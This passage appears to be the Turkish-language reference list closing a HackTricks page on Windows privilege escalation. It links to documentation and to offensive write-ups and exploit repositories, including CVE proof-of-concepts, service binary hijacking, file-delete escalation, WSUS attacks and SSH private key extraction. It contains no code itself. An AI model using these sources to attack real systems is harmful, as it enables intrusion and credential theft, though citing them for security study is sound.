- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi görevleri, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Servis ikili dosyalarını ele geçirme](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Yarış Durumlarını Zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitifi](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silmelerini Kötüye Kullanarak Yetki Yükseltme ve Diğer Harika Hileler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da Yerel Yetki Yükseltmeye Olanak Tanıyan 1-Day Güvenlik Açığı](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Bir Görüntü Değişikliğinin Yetki Yükseltmeye Yol Açtığı Kerberos Kaynak Tabanlı Kısıtlı Delegasyonu](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
